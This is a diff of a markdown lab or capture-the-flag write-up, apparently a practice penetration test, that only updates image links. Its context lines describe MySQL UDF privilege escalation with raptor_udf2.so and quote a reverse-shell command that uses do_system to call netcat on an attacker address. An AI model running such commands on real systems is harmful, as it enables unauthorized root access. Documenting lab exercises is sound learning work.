@@ -203,7 +203,7 @@ Enumerated top 200 UDP ports:
 
 #### Typed "show variables like '%plugin%';" to show the current plugin directory in the database
 
-![](../Images/Pasted%20image%2020220605152325.png)
+![](Pasted%20image%2020221001100121.png)
 
 #### Typed "use mysql;"
 
@@ -217,13 +217,13 @@ Enumerated top 200 UDP ports:
 
 #### Typed "select * from mysql.func;" to conirm the "raptor_udf2.so" shared object file got placed in the do_system function table:
 
-![](../Images/Pasted%20image%2020220605153153.png)
+![](Pasted%20image%2020221001100150.png)
 
 #### Started a netcat listner on my kali machine listening on port 8295
 
 #### Typed "select do_system('nc 192.168.49.101 8295 -e /bin/bash');" in mysql database on target machine and received a root shell:
 
-![](../Images/Pasted%20image%2020220605153640.png)
+![](Pasted%20image%2020221001100235.png)
 
 
 ---
